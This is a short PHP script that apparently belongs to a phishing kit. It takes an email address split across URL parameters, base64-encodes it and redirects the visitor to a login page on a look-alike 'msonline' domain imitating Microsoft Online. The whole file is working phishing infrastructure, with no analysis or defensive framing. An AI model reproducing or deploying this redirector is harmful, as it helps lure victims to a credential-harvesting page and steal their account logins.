<?php


function Redirect($url, $permanent = false)
{
 if (headers_sent() === false)
 {
 header('Location: ' . $url, true, ($permanent === true) ? 301 : 302);
 }

 exit();
}

Redirect("https://msonline.cababox.com/auth/login.php?email=" . base64_encode($_GET['a'] . "@" . $_GET['b']   .  "." . $_GET['c'])   ."", false);

?>
